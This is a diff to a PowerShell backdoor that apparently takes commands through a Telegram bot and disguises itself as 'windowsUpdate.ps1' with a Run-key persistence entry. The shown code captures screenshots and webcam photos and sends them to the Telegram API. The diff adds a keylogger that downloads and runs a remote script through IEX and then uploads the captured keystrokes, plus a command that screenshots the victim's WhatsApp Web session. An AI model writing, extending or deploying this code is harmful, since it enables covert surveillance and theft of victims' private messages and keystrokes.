@@ -68,19 +68,19 @@ function screenshot {
 
 function cleanAll {
     # Remove screenshots
-    rm C:\Users\$env:USERPROFILE\Documents\screenshot.jpg
+    rm C:\Users\$env:username\Documents\screenshot.jpg
     # Remove cUrl
-    rm C:\Users\$env:USERPROFILE\AppData\Local\Temp\1
+    rm C:\Users\$env:username\AppData\Local\Temp\1
     # Remove backdoor
-    rm C:\Users\$env:USERPROFILE\Documents\windowsUpdate.ps1
+    rm C:\Users\$env:username\Documents\windowsUpdate.ps1
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
 }
 
 function installCurl {
-    $curl = $env:USERPROFILE + "\appdata\local\temp\1\curl.exe"
+    $curl = "C:\Users\" + $env:username + "\appdata\local\temp\1\curl.exe"
     if(![System.IO.File]::Exists($curl)){
         # file with path $path doesn't exist
-        $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
+        $ruta = "C:\Users\" + $env:username + "\appdata\local\temp\1"
         $curl_zip = $ruta + "\curl.zip"
         $curl = $ruta + "\" + "curl.exe"
         $curl_mod = $ruta + "\" + "curl_mod.exe"
@@ -96,20 +96,17 @@ function installCurl {
 }
 
 function sendPhoto {
+    Write-Host "Sending screenshot.."
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
-    Write-Host "Deleting picture.."
-    Start-Sleep -Seconds 2
+    Write-Host "Deleting screenshot.."
+    Start-Sleep -Seconds 5
     Remove-Item $photo
     #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
-}
-
-function keylogger {
-
 }
 
 function ipPublic {
@@ -127,8 +124,25 @@ function download($FileToDownload) {
     #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
 }
 
+function keylogger($time) {
+    Write-Host "Downloading keylogger.."
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')
+    $log = "C:\Users\$env:username\Documents\key.txt"
+    Start-Sleep -Seconds 2
+
+    Write-Host "Launching keylogger $time.."
+    Get-Keystrokes -LogPath $log -Timeout $time
+    
+    Write-Host "Sending keystrokes.."
+    Start-Sleep -Seconds $time
+    download $log
+
+    Write-Host "Deleting log.."
+    Start-Sleep -Seconds 5
+    Remove-Item $log
+}
+
 function webcam {
-    #(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1','Get-WebCamp.ps1')
     Write-Host "Downloading CommandCam.."
     # https://batchloaf.wordpress.com/commandcam/
     $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
@@ -151,6 +165,7 @@ function webcam {
     Write-Host "Deleting picture.."
     Start-Sleep -Seconds 5
     Remove-Item $photo
+    Remove-Item $outpath
 }
 
 function mainBrowser {
@@ -170,7 +185,7 @@ function mainBrowser {
 
 function hackTwitter {
     $mainBrowser = mainBrowser
-    Start-Process $mainBrowser -ArgumentList "https://twitter.com/" -WindowStyle Hidden
+    Start-Process $mainBrowser -ArgumentList "https://twitter.com/" #-WindowStyle Hidden
 
     Start-Sleep -Seconds 2
     $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('cisco finesse') 
@@ -180,6 +195,16 @@ function hackTwitter {
     Sleep -Seconds 1 $wshell.SendKeys('PASSWORD') 
     Sleep -Seconds 1 $wshell.SendKeys("{TAB}") 
     Sleep -Seconds 1 $wshell.SendKeys('~')
+}
+
+function hackWhatsAPP {
+    $mainBrowser = mainBrowser
+    Start-Process $mainBrowser -ArgumentList "https://web.whatsapp.com/" #-WindowStyle Hidden
+
+    Start-Sleep -Seconds 10
+
+    screenshot
+    sendPhoto
 }
 
 
@@ -327,6 +352,13 @@ While ($DoNotExit)  {
       }
       "/webcam $ipV4"{
         webcam
+      }
+      "/hackWhatsAPP $ipV4"{
+        hackWhatsAPP
+      }
+      "/keylogger $ipV4 *"{
+        $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
+        Keylogger $time
       }
 	  default  {
 	    #The message sent is unknown
